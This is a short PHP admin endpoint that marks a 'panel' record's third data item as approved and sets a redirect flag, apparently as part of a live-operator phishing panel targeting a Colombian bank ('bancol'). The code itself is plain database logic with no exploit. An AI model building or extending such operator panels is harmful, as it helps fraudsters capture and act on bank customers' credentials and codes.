<?php
require_once '../bancol/config.php';

if (!isset($_SESSION['admin_logged_in'])) {
    http_response_code(403);
    die('Acceso denegado');
}

$conn = getConnection();
$uuid = $conn->real_escape_string($_GET['id']);

// Aprobar y activar redirección final
$stmt = $conn->prepare("UPDATE  panel 
    SET dato3_status = 'approved', 
        redirect_flag = 1 
    WHERE id = ?");
$stmt->bind_param("s", $uuid);
$stmt->execute();

$stmt->close();
$conn->close();

echo "OK"; // Respuesta para AJAX